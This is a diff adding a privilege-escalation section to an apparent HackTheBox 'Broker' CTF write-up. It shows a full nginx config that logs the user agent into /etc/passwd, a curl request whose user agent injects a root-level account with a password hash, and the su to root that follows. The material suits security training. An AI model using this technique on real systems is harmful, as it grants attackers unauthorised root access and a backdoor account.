@@ -135,6 +135,7 @@ server {
                 # as directory, then fall back to displaying a 404.
                 try_files $uri $uri/ =404;
         }
+}
 ```
 
 Now because `nginx` runs this site as `root`, it can read any file that root can.
@@ -148,10 +149,129 @@ activemq@broker:~$ curl localhost:8001/root
 <THEFLAG>
 ```
 
+## RCE
 
+Ok, so we have the flag but we're not really root...  We **could** read `/etc/shadow` and attempt to crack the hash, but that relies on `root` having a weak password.
 
+Well, we can define the log format of `nginx`, so we can potentially write whatever we want to any file... Below shows the new config
 
+```
+user root;
+worker_processes auto;
+pid /run/nginx.pid;
+include /etc/nginx/modules-enabled/*.conf;
 
+events {
+        worker_connections 768;
+        # multi_accept on;
+}
 
+http {
+
+        ##
+        # Basic Settings
+        ##
+
+        sendfile on;
+        tcp_nopush on;
+        types_hash_max_size 2048;
+        # server_tokens off;
+
+        # server_names_hash_bucket_size 64;
+        # server_name_in_redirect off;
+
+        include /etc/nginx/mime.types;
+        default_type application/octet-stream;
+
+        ##
+        # SSL Settings
+        ##
+
+        ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; # Dropping SSLv3, ref: POODLE
+        ssl_prefer_server_ciphers on;
+
+        ##
+        # Logging Settings
+        ##
+        log_format test $http_user_agent; #<-------------------- CHANGE 1
+        access_log /dev/shm/e/access.log test; #<-------------------- CHANGE 2
+        error_log /dev/shm/e/error.log; #<--------------------------- CHANGE 3
+
+        ##
+        # Gzip Settings
+        ##
+
+        gzip on;
+
+        # gzip_vary on;
+        # gzip_proxied any;
+        # gzip_comp_level 6;
+        # gzip_buffers 16 8k;
+        # gzip_http_version 1.1;
+        # gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;
+
+        ##
+        # Virtual Host Configs
+        ##
+
+        include /etc/nginx/conf.d/*.conf;
+        include /dev/shm/e/sites-enabled/*; 
+}
+
+```
+
+And when I run the following
+```bash
+activemq@broker:/dev/shm/e$ curl localhost:8001/ --user-agent INJECTED
+activemq@broker:/dev/shm/e$ cat access.log
+INJECTED
+```
+So now we need something to inject, we could potentially inject into /etc/password or /etc/shadow, but that might  completely overwrite it.
+
+So I'll make a backup!
+
+I've written a mini python script for this situation, called [fakeroot](https://github.com/Henryisnotavailable/Fakeroot/blob/main/fakeroot.py)
+
+By running it locally, I generate some hashes I can use
+```bash
+┌──(kali㉿kali)-[~/…/HTB/easy/broker/root]
+└─$ python3 fakeroot.py -u oops -p 'password'
+user:pass
+oops:password
+
+For shadow file:
+oops:$6$potato$tBpm/m/PkRRzRYIrjQg6yprA0LhuPFJeXs1FWiDKvHWLYJdKxYZcENtiDo0kUnHoZXJrcWLgcUZ//Du.7a1Zc/:19477:0:99999:7:::
+For passwd file:
+oops:x:0:0:root:/root:/bin/bash
+Or... for hash in passwd file: (less secure)
+oops:$6$potato$tBpm/m/PkRRzRYIrjQg6yprA0LhuPFJeXs1FWiDKvHWLYJdKxYZcENtiDo0kUnHoZXJrcWLgcUZ//Du.7a1Zc/:0:0:root:/root:/bin/bash
+```
+
+So I need to modify the nginx.conf file to point to `/etc/passwd`, then send a user agent string.
+
+```
+        log_format test $http_user_agent;
+        access_log /etc/passwd test; #<---------- CHANGE 1
+```
+
+And then send the user agent.
+```bash
+activemq@broker:/dev/shm/e$ curl localhost:8001/ --user-agent 'oops:$6$potato$tBpm/m/PkRRzRYIrjQg6yprA0LhuPFJeXs1FWiDKvHWLYJdKxYZcENtiDo0kUnHoZXJrcWLgcUZ//Du.7a1Zc/:0:0:root:/root:/bin/bash'
+```
+Check `/etc/passwd`
+```bash
+activemq@broker:/dev/shm/e$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+[..]
+oops:$6$potato$tBpm/m/PkRRzRYIrjQg6yprA0LhuPFJeXs1FWiDKvHWLYJdKxYZcENtiDo0kUnHoZXJrcWLgcUZ//Du.7a1Zc/:0:0:root:/root:/bin/bash #<------- I'M IN
+```
+And finally switch to `oops`.
+```bash
+activemq@broker:/dev/shm/e$ su oops
+Password: 
+root@broker:/dev/shm/e# cd /root
+root@broker:~# ls
+cleanup.sh  root.txt
+```
 
 
